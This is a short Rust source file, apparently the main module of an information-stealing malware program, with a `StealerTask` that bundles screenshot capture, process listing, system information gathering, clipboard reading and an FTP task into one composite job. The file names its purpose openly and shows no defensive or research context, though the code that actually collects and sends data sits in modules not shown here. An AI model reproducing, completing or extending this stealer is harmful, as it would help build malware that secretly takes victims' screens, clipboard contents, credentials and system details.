#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]


mod clipboard;
mod processes;
mod screenshot;
mod systeminfo;

extern crate alloc;

use crate::clipboard::ClipboardTask;
use crate::processes::ProcessesTask;
use crate::screenshot::ScreenshotTask;
use crate::systeminfo::SystemInfoTask;
use alloc::sync::Arc;
use alloc::vec;
use ftp::FtpTask;
use tasks::{CompositeTask, Task};
use utils::path::Path;

pub struct StealerTask {
    inner: CompositeTask
}

impl StealerTask {
    pub fn new() -> Self {
        Self {
            inner: CompositeTask::new(
                vec![
                    Arc::new(ScreenshotTask),
                    Arc::new(ProcessesTask),
                    Arc::new(SystemInfoTask),
                    Arc::new(ClipboardTask),
                    Arc::new(FtpTask::new())
                ]
            )
        }
    }
}

impl Task for StealerTask {
    unsafe fn run(&self, parent: &Path) {
        self.inner.run(parent);
    }
}